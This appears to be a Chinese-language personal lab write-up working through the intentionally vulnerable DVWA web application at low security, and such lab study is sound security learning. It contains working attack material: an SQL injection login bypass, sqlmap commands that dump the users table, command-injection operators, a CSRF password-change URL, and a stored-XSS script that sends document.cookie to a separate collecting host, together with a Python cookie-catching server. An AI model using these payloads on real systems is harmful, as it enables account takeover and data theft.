---
icon: pen-to-square
date: 2025-03-14
tags: 
title: DVWA
category:
  - 项目
---
# 前言
## **set up**
```bash
Downloading DVWA from GitHub...
Cloning into '/var/www/html/DVWA'...
remote: Enumerating objects: 5105, done.
remote: Counting objects: 100% (91/91), done.
remote: Compressing objects: 100% (24/24), done.
remote: Total 5105 (delta 79), reused 67 (delta 67), pack-reused 5014 (from 4)
Receiving objects: 100% (5105/5105), 2.49 MiB | 2.08 MiB/s, done.
Resolving deltas: 100% (2489/2489), done.
MariaDB service is already enabled.
MariaDB service is already running.

Default credentials:
Username: root

Password: [No password just hit Enter]
Enter SQL user: root
Enter SQL password (press Enter for no password):
SQL commands executed successfully.
Configuring DVWA...
Configuring permissions...
Configuring PHP...
Apache service is already enabled.
Restarting Apache...
DVWA has been installed successfully. Access http://localhost/DVWA to get started.
Credentials:
Username: admin
Password: password

With ♡ by IamCarron
root@ubantuu:~# ls
mc  path  vulhub
root@ubantuu:~#

```
docker共享文件夹
```bash
sudo bash -c "$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"
```
# low
## brute Force
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314193624.png)
这题可以字典攻击
用集群炸弹攻击，会遍历所有排列
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314193938.png)
如果用pitchfork攻击，是这样的排列，按照字典的排列
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194133.png)
简单列表就很奇怪了，只会插入一个payload位置
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194626.png)
碰撞攻击会为每一个payload使用同一个字典
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194822.png)


然后构造字典，实际情况会更复杂，花费的时间也更多
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194045.png)

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194441.png)
成功的组合长度是不同的
还有sql注入的方面也可以攻破此关
```sql
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```
源码的sql逻辑很简单，我们只需要
构建这样的payload即可通过
`user;` admin' or '1='1

## Command Injection
& ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行  
- 似乎会同时执行两个命令
&&：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行  
- 等待前一个命令执行后才会执行下一个命令
|：前面一个命令无论是否执行，后面的命令都能执行且    **只执行后面一个**  

||：前面一个命令不能正常执行后，才能执行后面一个命令

；:跟&&的原理差不多
看看源码
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314200721.png)
可以发现会将"ping"直接拼接到我们的"地址"上
我们可以利用这个进行上面的命令拼接符进行攻击，执行危险操作

=======

## CSRF（跨站请求伪造）
```php
$pass = $_GET[ 'password' ];
```

这是一切问题的根源，这段代码说明了包含修改密码的请求包可以在url中集成，意味着攻击者可以通过这个url构建一个按钮，访问这个页面，在不知不觉中造成密码更改
```url
http://192.168.254.128/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#
```

## File Inclusion
文件包含漏洞，可移植性任意文件，包括服务器本地文件和远程文件
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>


```

file upload
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314204935.png)
没有对文件做过滤并且会返回文件路径

=======


## # Vulnerability: Insecure CAPTCHA

=======
## SQL Injection (Blind)
^use-sqlmap
先测试正常回显,输入1
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315111850.png)
然后输入-1
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315112001.png)
这里的逻辑
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315112027.png)
返回值不为0(不为false)时才会回显exists
那么很好办了，常规的布尔盲注
测试闭合,1'显示miss，1“显示exists，意味着闭合为'
用length(database())试数据库大小，到4时为正确 ^d5e614
```
1' and length(database())=4 #
```
然后使用sqlmap，注意cookie是这个
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315120605.png)
示例命令
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" --current-db
```
注意--cookie的值需要双引号框住[[sql注入#^sqlmap|sqlmap教程]]
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315122048.png)
成功爆库名
继续爆库名
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" -D dvwa --tables
```
- `-D`: 指定库名
- 爆表名
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315122434.png)
比刚才快很多
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" -D dvwa -T users --dump --batch
```
- --batch:不再询问确认
- --dump：爆数据
- -D dvwa -T users：指定已知数据
还是比较快的
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315123803.png)
成功
## XSS(Reflected)
反射型xss

XSS漏洞的本质在于弹到网页的用户输入的内容，如果没有过滤用javascript闭合就会造成脚本执行，会造成用户信息泄露等危害
验证是否有XSS的实例
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315124529.png)

```html
<script>alert('hack')</script>
```
回显，验证有XSS注入漏洞
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315124722.png)
网页代码中的位置
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315125731.png)


======

----
## XSS(Stored)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query_params = parse_qs(parsed_path.query)
        query_params = parse_qs(parsed_path.query)
         # 打印请求信息到控制台
        # print(f"\n[请求路径] {parsed_path.path}")
        # print(f"[查询参数] {json.dumps(query_params, indent=2)}")
        if "cookie" in query_params:
            print(f"已收集到cookie")
            print(f"[Cookie] {query_params['cookie'][0]}"+"\n")
        # print("[请求头]")
        # for header, value in self.headers.items():
        #     print(f"  {header}: {value}")
            # 发送响应
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', '0')
        self.end_headers()
if __name__ == '__main__':
    server_address = ('', 7989)
    httpd = HTTPServer(server_address, RequestHandler)
    print("服务器已启动，监听端口 7989...")
    httpd.serve_forever()
```


写了一个简单的发送脚本
```javascript
<script>   var url = 'http://192.168.1.21:14444?cookie=' + encodeURIComponent(document.cookie);   var xhr = new XMLHttpRequest();   xhr.open('GET', url, true);   xhr.send(); </script>
```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250317221248.png)

-----

## XSS（DOM）
DOM：DOM（Document Object Model）即文档对象模型，是W3C制定的标准接口规范，是一种处理HTML和XML文件的标准API。DOM提供了对整个文档的访问模型，将文档作为一个树形结构，树的每个结点表示了一个HTML标签或标签内的文本项。DOM树结构精确地描述了HTML文档中标签间的相互关联性。将HTML或XML文档转化为DOM树的过程称为解析(parse)。HTML文档被解析后，转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现。

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250318191921.png)
可以发现url带有default参数，我们可以在这里执行命令

## JavaScript

提示输入success，但是直接看源码,这里引入了外部库MD5哈希库

```js
!function(n){...}(this);
```
这是ROT13 编码函数
```js
function rot13(inp) {
    return inp.replace(/[a-zA-Z]/g,function(c){
        return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);
    });
}
```
生成Token的逻辑
```js
function generate_token() {
    var phrase = document.getElementById("phrase").value; //- 从页面中取 `id="phrase"` 的输入框的值（用户输入）。
    
    document.getElementById("token").value = md5(rot13(phrase));
    '''
    - 对输入值依次进行 **ROT13 编码** → **MD5 哈希**。
	- 将结果写入 `id="token"` 的输入框。
    '''
}
generate_token();
```
那么，我们先运行generate_token();将其写入隐藏的id='token'输入框
